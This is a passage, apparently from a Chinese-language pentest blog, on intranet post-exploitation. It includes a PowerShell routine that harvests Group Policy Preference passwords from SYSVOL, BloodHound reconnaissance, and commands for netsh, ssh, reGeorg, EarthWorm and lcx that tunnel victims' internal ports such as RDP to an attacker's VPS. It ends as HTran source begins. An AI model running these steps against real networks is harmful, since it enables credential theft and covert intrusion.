(!(<span class="variable">$UserName</span>)) &#123;<span class="variable">$UserName</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$Changed</span>)) &#123;<span class="variable">$Changed</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$NewName</span>)) &#123;<span class="variable">$NewName</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">                  </span><br><span class="line">            <span class="comment">#Create custom object to output results</span></span><br><span class="line">            <span class="variable">$ObjectProperties</span> = <span class="selector-tag">@</span>&#123;<span class="string">&#x27;Passwords&#x27;</span> = <span class="variable">$Password</span>;</span><br><span class="line">                                  <span class="string">&#x27;UserNames&#x27;</span> = <span class="variable">$UserName</span>;</span><br><span class="line">                                  <span class="string">&#x27;Changed&#x27;</span> = <span class="variable">$Changed</span>;</span><br><span class="line">                                  <span class="string">&#x27;NewName&#x27;</span> = <span class="variable">$NewName</span>;</span><br><span class="line">                                  <span class="string">&#x27;File&#x27;</span> = <span class="variable">$File</span>&#125;</span><br><span class="line">                </span><br><span class="line">            <span class="variable">$ResultsObject</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> PSObject <span class="literal">-Property</span> <span class="variable">$ObjectProperties</span></span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;The password is between &#123;&#125; and may be more than one value.&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$ResultsObject</span>) &#123;<span class="keyword">Return</span> <span class="variable">$ResultsObject</span>&#125; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">#ensure that machine is domain joined and script is running as a domain account</span></span><br><span class="line">        <span class="keyword">if</span> ( ( ((<span class="built_in">Get-WmiObject</span> Win32_ComputerSystem).partofdomain) <span class="operator">-eq</span> <span class="variable">$False</span> ) <span class="operator">-or</span> ( <span class="operator">-not</span> <span class="variable">$Env:USERDNSDOMAIN</span> ) ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="string">&#x27;Machine is not a domain member or User is not a member of the domain.&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#discover potential files containing passwords ; not complaining in case of denied access to a directory</span></span><br><span class="line">        <span class="built_in">Write-Verbose</span> <span class="string">&quot;Searching \\<span class="variable">$Server</span>\SYSVOL. This could take a while.&quot;</span></span><br><span class="line">        <span class="variable">$XMlFiles</span> = <span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="string">&quot;\\<span class="variable">$Server</span>\SYSVOL&quot;</span> <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue <span class="literal">-Include</span> <span class="string">&#x27;Groups.xml&#x27;</span>,<span class="string">&#x27;Services.xml&#x27;</span>,<span class="string">&#x27;Scheduledtasks.xml&#x27;</span>,<span class="string">&#x27;DataSources.xml&#x27;</span>,<span class="string">&#x27;Printers.xml&#x27;</span>,<span class="string">&#x27;Drives.xml&#x27;</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> ( <span class="operator">-not</span> <span class="variable">$XMlFiles</span> ) &#123;<span class="keyword">throw</span> <span class="string">&#x27;No preference files found.&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Write-Verbose</span> <span class="string">&quot;Found <span class="variable">$</span>(<span class="variable">$XMLFiles</span> | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords.&quot;</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$File</span> <span class="keyword">in</span> <span class="variable">$XMLFiles</span>) &#123;</span><br><span class="line">            <span class="variable">$Result</span> = (<span class="built_in">Get-GppInnerFields</span> <span class="variable">$File</span>.Fullname)</span><br><span class="line">            <span class="built_in">Write-Output</span> <span class="variable">$Result</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Seatbelt"><a href="#Seatbelt" class="headerlink" title="Seatbelt"></a>Seatbelt</h3><p>这个工具能做一些自动化的信息收集，收集的信息很多，包括不限于google历史记录、用户等等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#项目地址</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;Seatbelt</span><br></pre></td></tr></table></figure><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>我们可以利用Bloodhound做一些自动化的信息收集，包括用户、计算机、组织架构、最快的攻击途径等。但是自动化也意味着告警，该漏洞做自动化信息收集时，会在内网设备上产生大量的告警，按需使用。</p><p>项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;BloodHoundAD&#x2F;BloodHound</span><br></pre></td></tr></table></figure><p>使用文档直接看这边即可了，我就懒得copy过来了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bloodhound.readthedocs.io&#x2F;</span><br></pre></td></tr></table></figure><p>这里有两个版本，一个PS版本一个exe版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe  -c all</span><br></pre></td></tr></table></figure><p>运行后会在本地生成两个文件</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/46.png?raw=true" alt="image-20200801121332755"></p><p>接下来要搭个服务器，我们需要如下清单</p><ul><li>neo4j-community-4.1.1-windows</li><li>BloodHound-win32-x64</li><li>JAVA环境（OpenJDK 11）</li></ul><p>搭建步骤跟官方文档走就好了，我这边就用kali搭neo4j服务了，不想破坏windows目前的环境</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/47.png?raw=true" alt="image-20200801124946426"></p><p>这是连接上了的环境，并且处理了我们先生成的zip格式文件</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/48.png?raw=true" alt="image-20200801125325408"></p><p>找到域环境管理员最短路径，这工具第一次接触，不敢乱写，后面研究下补充下</p><h2 id="狡兔三窟"><a href="#狡兔三窟" class="headerlink" title="狡兔三窟"></a>狡兔三窟</h2><h3 id="是否出网"><a href="#是否出网" class="headerlink" title="是否出网"></a>是否出网</h3><p>简单的命令如下，复杂点的可以看<a href="https://www.ascotbe.com/2020/07/12/RemoteDownlo">恶意程序研究之远程下载恶意程序</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping</span><br><span class="line">curl</span><br><span class="line">nslookup</span><br></pre></td></tr></table></figure><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><h4 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h4><p>netsh是windows自带的命令，可以允许修改计算机的网络配置。也可以被拿来做端口转发。</p><p>详细内容可以参考官方文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-tw&#x2F;windows-server&#x2F;networking&#x2F;technologies&#x2F;netsh&#x2F;netsh-contexts</span><br></pre></td></tr></table></figure><p>A机器执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh  interface portproxy add v4tov4 listenport&#x3D;5555 connectport&#x3D;3389 connectaddress&#x3D;192.168.1.1  protocol&#x3D;tcp</span><br></pre></td></tr></table></figure><p>B机器访问A机器的5555端口，即是192.168.1.1的3389端口</p><h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><p>ssh一般被拿来登录linux机器，也可以拿来做代理和转发。</p><h5 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">-1：强制使用ssh协议版本1.</span><br><span class="line">-2：强制使用ssh协议版本2.</span><br><span class="line">-4：强制使用IPv4地址.</span><br><span class="line">-6：强制使用IPv6地址.</span><br><span class="line">-A：开启认证代理连接转发功能.</span><br><span class="line">-a：关闭认证代理连接转发功能.</span><br><span class="line">-b bind_address</span><br><span class="line">使用本机指定地址作为对应连接的源ip地址.</span><br><span class="line">-c blowfish|3des|des</span><br><span class="line">请求压缩所有数据.</span><br><span class="line">-C:要求进行数据压缩 (包括 stdin, stdout, stderr 以及转发 X11 和 TCP&#x2F;IP 连接 的数据).</span><br><span class="line">-D port</span><br><span class="line">    指定一个本地机器 &#96;&#96;动态的 应用程序端口转发. </span><br><span class="line">-F configfile</span><br><span class="line">指定ssh指令的配置文件.</span><br><span class="line">-f：后台执行ssh指令.</span><br><span class="line">-g：允许远程主机连接主机的转发端口.</span><br><span class="line">-i identity_file</span><br><span class="line">指定身份文件.</span><br><span class="line">-I smartcard_device</span><br><span class="line">    指定智能卡(smartcard)设备. 参数是设备文件, 能够用它和智能卡通信, 智能卡里面存储了用户的 RSA 私钥.</span><br><span class="line">-l login_name</span><br><span class="line">指定连接远程服务器登录用户名.</span><br><span class="line">-L port:host:hostport</span><br><span class="line">    将本地机(客户机)的某个端口转发到远端指定机器的指定端口. </span><br><span class="line">-k：禁止转发 Kerberos 门票和 AFS 令牌. </span><br><span class="line">-m mac_spec</span><br><span class="line">    另外, 对于协议第二版, 这里可以指定一组用逗号隔开, 按优先顺序排列的 MAC(消息验证码)算法 (message authentication code). </span><br><span class="line">-n：把 stdin 重定向到 &#x2F;dev&#x2F;null (实际上防止从 stdin 读取数据). </span><br><span class="line">-N：不执行远程指令,用于转发端口.</span><br><span class="line">-o option</span><br><span class="line">指定配置选项.</span><br><span class="line">-p port</span><br><span class="line">指定远程服务器上的端口.</span><br><span class="line">-q：静默模式.</span><br><span class="line">-s:请求远程系统激活一个子系统.</span><br><span class="line">-R port:host:hostport</span><br><span class="line">    将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. </span><br><span class="line">-t:强制分配伪终端.</span><br><span class="line">-T:禁止分配伪终端.</span><br><span class="line">-v:冗详模式.</span><br><span class="line">-X：开启X11转发功能.</span><br><span class="line">-x：关闭X11转发功能.</span><br><span class="line">-y：开启信任X11转发功能.</span><br></pre></td></tr></table></figure><ul><li><p>开启socks代理：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -D 6666 root@1.1.1.1</span><br></pre></td></tr></table></figure><p>输入1.1.1.1机器密码，本地利用proxychains等类似工具连接本地的6666端口的sock5连接即可代理1.1.1.1的网络。</p></li><li><p>控制A、B机器，A能够访问B，且能出网，B能够访问C，但不能出网，A不能访问C：</p><p>A机器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -L 2121:CIP:21 root@BIP</span><br></pre></td></tr></table></figure><p>输入BIP机器密码，访问A的2121端口即是访问CIP的21端口。</p></li><li><p>控制A机器，A能够访问B：</p><p>A机器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -R 2121:BIP:21 root@hackervps</span><br></pre></td></tr></table></figure><p>输入黑客vps密码，访问黑客vps的2121端口即是访问BIP的21端口。</p></li></ul><h4 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h4><p>reGeorg是一款开源的socks代理软件，可以解决当机器不出网时，使用http代理进入内网。</p><p>项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sensepost&#x2F;reGeorg</span><br></pre></td></tr></table></figure><p>根据网站支持的语言，把相应的tunnel.xx传到服务器上，访问tunnel.xx显示“Georg says, ‘All seems fine’”，说明基本ok。</p><p>然后本地访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pythonreGeorgSocksProxy.py -p 9999 -u http://1.1.1.1:8080/tunnel.xx</span><br></pre></td></tr></table></figure><p>利用proxychains等类似工具连接本地的9999端口的sock5连接即可代理1.1.1.1的网络。</p><h4 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h4><p>官网有使用文档和下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;rootkiter.com&#x2F;EarthWorm&#x2F;</span><br></pre></td></tr></table></figure><ul><li><p>受害者机器有外网ip并可直接访问</p><p>把ew传到对方服务器上，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 8888</span><br></pre></td></tr></table></figure><p>现在本地利用proxychains等类似工具连接本地的对方服务器的8888端口的sock5连接即可代理对方的网络。</p></li><li><p>控制A机器，A能够访问B，通过A访问B</p><p>在自己外网服务器上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure><p>对方服务器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rssocks -d yourvpsip -e 8888</span><br></pre></td></tr></table></figure><p>利用proxychains等类似工具可通过连接你的外网vps的1080 端口的socks5，即可代理受害者服务器的网络。</p></li><li><p>控制A、B机器，A能够访问B，B能够访问C，A有外网ip并可直接访问，通过A来使用B的流量访问C</p><p>B机器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure><p>A机器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_tran -l 1080 -f BIP -g 9999</span><br></pre></td></tr></table></figure><p>利用proxychains等类似工具可通过连接A的1080 端口的socks5，即可代理B服务器的网络。</p></li><li><p>控制A、B机器，A能够访问B，B能够访问C，A没有外网ip，通过A连接自己的外网vps来使用B的流量访问C：</p><p>自己vps执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_listen -l 1080 -e 8888</span><br></pre></td></tr></table></figure><p>B机器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure><p>A机器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_slave -d vpsip -e 8888 -f BIP -g 9999</span><br></pre></td></tr></table></figure><p>利用proxychains等类似工具可通过连接你自己的vps的1080 端口的socks5，即可代理B服务器的网络。</p></li></ul><h4 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h4><p>lcx是一款轻便的端口转发工具。</p><ul><li><p>反向转发</p><p>外网VPS机器监听：</p><p>1111为转发端口，2222为本机任意未被占用的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen 1111 2222</span><br></pre></td></tr></table></figure><p>受害者机器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave VPSip 1111 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p>连接外网VPS机器的2222端口即是连接受害者机器的3389。</p></li><li><p>正向转发</p><p>A机器执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran 1111 2.2.2.2 8080</span><br></pre></td></tr></table></figure><p>访问A机器的1111端口即是访问2.2.2.2的8080端口。</p></li></ul><p>这边只找到源码，我改了一下VS2019可以编译通过</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Usage   : E:\&gt;HTran</span></span><br><span class="line"><span class="comment">*       : ======================== HUC Packet Transmit Tool V1.00 =======================</span></span><br><span class="line"><span class="comment">*       : =========== Code by lion &amp; bkbll, Welcome to [url]http://www.cnhonker.com[/url] ==========</span></span><br><span class="line"><span class="comment">*       :</span></span><br><span class="line"><span class="comment">*       : [Usage of Packet Transmit:]</span></span><br><span class="line"><span class="comment">*       :  HTran -&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span></span><br><span class="line"><span class="comment">*       :</span></span><br><span class="line"><span class="comment">*       : [option:]</span></span><br><span class="line"><span class="comment">*       :  -listen &lt;ConnectPort&gt; &lt;TransmitPort&gt;</span></span><br><span class="line"><span class="comment">*       :  -tran  &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span></span><br><span class="line"><span class="comment">*       :  -slave  &lt;ConnectHost&gt; &lt;ConnectPort&gt; &lt;TransmitHost&gt; 